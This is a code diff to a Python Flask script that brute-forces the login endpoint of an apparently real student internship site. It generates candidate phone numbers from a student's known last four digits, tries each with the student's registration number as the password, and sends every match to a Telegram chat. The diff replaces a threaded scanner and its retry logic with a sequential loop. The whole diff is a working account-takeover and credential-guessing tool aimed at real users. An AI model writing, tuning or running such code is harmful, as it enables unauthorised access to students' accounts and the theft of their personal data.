@@ -2,7 +2,6 @@ import requests
 import time
 import os
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask, jsonify, render_template_string
 
 app = Flask(__name__)
@@ -12,7 +11,6 @@ CHAT_ID = os.environ.get("CHAT_ID", "1634075045")
 
 API_URL = "https://www.eduintern.in/api/auth/login"
 FILE_NAME = "students.txt" 
-THREADS = 20# Threads kam kar diye taaki server hang na ho
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -48,7 +46,6 @@ def check(phone, password):
     except Exception:
         return {"status": "ERROR", "success": False, "phone": phone}
 
-# NUMBER GENERATOR (RAM ME LOAD NAHI HOGA)
 def generate_numbers(last4):
     priority_1 = ['98', '97', '88', '70', '77', '84', '85', '91']
     priority_2 = ['89', '90', '93', '96', '80', '81', '82', '83', '86', '87']
@@ -77,48 +74,30 @@ def process_student(index, reg_no, last4):
     global current_reg, total_scanned, total_to_scan
     current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
     total_scanned = 0
-    total_to_scan = 399968 # Approx
+    total_to_scan = 399968 
     
     add_log("==========================================")
     add_log(f"TARGET START: {reg_no} (Ending: {last4})")
     add_log("==========================================")
     
     found_phone = None
-    pending_phones = []
     
-    # Generator use kar rahe hain taaki RAM full na ho
-    numbers = list(generate_numbers(last4))
-    
-    with ThreadPoolExecutor(max_workers=THREADS) as ex:
-        futures = {ex.submit(check, phone, reg_no): phone for phone in numbers}
+    # 1 BY 1 FAST SCAN (No threads, maximum speed)
+    for phone in generate_numbers(last4):
+        if found_phone: break
         
-        for future in as_completed(futures):
-            total_scanned += 1
-            res = future.result()
+        res = check(phone, reg_no)
+        total_scanned += 1
+        
+        if res["success"]:
+            found_phone = res["phone"]
+            add_log(f"✅ MATCH FOUND! Phone: {found_phone}")
+            send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
+            break
             
-            if res["success"]:
-                found_phone = res["phone"]
-                add_log(f"✅ MATCH FOUND! Phone: {found_phone}")
-                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
-                break
-            
-            if res["status"] == "ERROR":
-                pending_phones.append(res["phone"])
-                
-            if total_scanned % 5000 == 0:
-                add_log(f"[{total_scanned}/{total_to_scan}] Scanning... Last: {res['phone']} ({res['status']})")
-
-    # Retry
-    if not found_phone and pending_phones:
-        add_log(f"⏳ Retrying {len(pending_phones)} missed numbers...")
-        for p_phone in pending_phones:
-            res = check(p_phone, reg_no)
-            if res["success"]:
-                found_phone = res["phone"]
-                add_log(f"✅ MATCH FOUND (in retry)! Phone: {found_phone}")
-                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
-                break
-            time.sleep(1)
+        # Har 5000 scan pe log dikhao
+        if total_scanned % 5000 == 0:
+            add_log(f"[{total_scanned}/{total_to_scan}] Scanning... Last: {res['phone']} ({res['status']})")
 
     if not found_phone:
         add_log(f"❌ NO MATCH for {reg_no}")
